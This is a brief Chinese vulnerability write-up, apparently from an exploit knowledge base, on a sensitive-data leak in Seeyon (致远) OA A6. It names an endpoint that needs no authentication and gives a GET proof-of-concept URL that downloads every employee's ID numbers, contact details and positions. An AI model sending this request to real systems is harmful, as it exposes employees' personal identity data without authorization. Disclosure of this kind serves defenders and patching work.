致远OA A6 敏感信息泄露（二）
============================

一、漏洞简介
------------

二、漏洞影响
------------

致远OA A6

三、复现过程
------------

##### 漏洞位置:

    http://www.0-sec.org/yyoa/DownExcelBeanServlet

##### 漏洞详情:

    版本:A6只有系统管理才有的权限，但是任意用户都可以访问。可以下载所有员工的个人信息，包括身份证、联系方式、职位等敏感信息。

##### 请求方式:

    Get

##### POC:

    http://www.0-sec.org/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=
